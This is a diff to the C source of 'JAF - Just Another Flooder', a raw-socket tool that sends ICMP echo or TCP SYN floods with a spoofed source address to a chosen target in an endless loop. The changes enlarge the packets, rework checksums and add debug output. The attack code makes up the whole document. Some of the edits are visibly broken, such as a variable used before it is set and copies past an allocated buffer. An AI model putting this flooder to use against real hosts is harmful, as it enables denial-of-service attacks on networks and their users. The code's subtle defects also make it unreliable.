@@ -7,7 +7,7 @@
 #include <netinet/tcp.h>
 #include "jaf.h"
 
-#define PKT_LEN 10000
+#define PKT_LEN 11000
 #define DELAY 8
 
 /*
@@ -62,6 +62,7 @@ unsigned short csum(unsigned short *buf, int nwords){
         sum += *buf++;
     sum = (sum >> 16) + (sum &0xffff);
     sum += (sum >> 16);
+    printf("%x\n", ~sum); 
     return ~sum;
 }
 
@@ -73,16 +74,17 @@ void sin_init(short port, char *addr, struct sockaddr_in *sin) {
 
 
 int main(int argc, char **argv) {
-	int sd, choose;
+	int sd, choose, data;
 	char buf[PKT_LEN];
 	struct iphdr *ip = (struct iphdr *) buf;
 	struct tcphdr *tcp = (struct tcphdr *) buf + sizeof(struct iphdr);
 	struct icmphdr *icmp = (struct icmphdr *) malloc(sizeof(struct icmphdr));
+	char tmp[PKT_LEN];
 	struct sockaddr_in sin;
 	int root = 1, *ptr = &root;
 	
 	if (argc < 4) {
-		printf("jaf <ip> <port> <source_ip>");
+		printf("jaf <ip> <port> <source_ip>\n");
 		return -1;
 	}
 	
@@ -92,7 +94,6 @@ int main(int argc, char **argv) {
 	ip->ihl = 5; 
 	ip->version = 4;
 	ip->tos = 16;
-	ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
 	ip->id = htons(50000);
 	ip->frag_off = 0;
 	ip->ttl = 64;
@@ -100,7 +101,7 @@ int main(int argc, char **argv) {
 	ip->saddr = inet_addr(argv[3]);
 	ip->daddr = inet_addr(argv[1]);
     
-	printf(".:[JAF - Just Another Flooder]:."
+	printf(".:[JAF - Just Another Flooder]:.\n"
 		   "[0] - ICMP ECHO Flood\n"
 		   "[1] - TCP SYN Flood\n\n");
 	
@@ -133,17 +134,23 @@ int main(int argc, char **argv) {
 	}
 	
 	else {
-		printf("WTF? 1 or 2");
+		printf("WTF? 1 or 2\n");
 		return -1;
 	}
 	
 	sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 	if (choose == 0) {
-		memcpy(buf+sizeof(struct iphdr), icmp, sizeof(struct icmphdr));
-		ip->check = csum((unsigned short *) buf, sizeof(struct iphdr) + sizeof(struct icmphdr));
+		ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + data;
+		memcpy(tmp, icmp, sizeof(struct icmphdr));
+		data = PKT_LEN - sizeof(struct icmphdr) - sizeof(struct iphdr);
+		icmp->checksum = csum((unsigned short *) tmp, sizeof(struct icmphdr) + data >> 1);
+		memcpy(buf+sizeof(struct iphdr), icmp, sizeof(struct icmphdr)+data);
+		printf("TOT_LEN: %d\n", sizeof(struct iphdr) + sizeof(struct icmphdr) + data);
+		ip->check = csum((unsigned short *) buf, sizeof(struct iphdr) + sizeof(struct icmphdr) + data >> 1);
 	}
 	
 	if (choose == 1) {
+		ip->tot_len = sizeof(struct tcphdr)+sizeof(struct iphdr);
 		ip->check = csum((unsigned short *) buf, sizeof(struct iphdr) + sizeof(struct tcphdr));
 	}
 	
@@ -151,6 +158,7 @@ int main(int argc, char **argv) {
 		printf("[-] ERROR: Are you sure that you are root?\n");
 		return -1;
 	}
+	printf("[+] Starting flood\n");
 	while (1) {
 		if (sendto(sd, buf, ip->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
 			printf("[-] Error sending the packet");
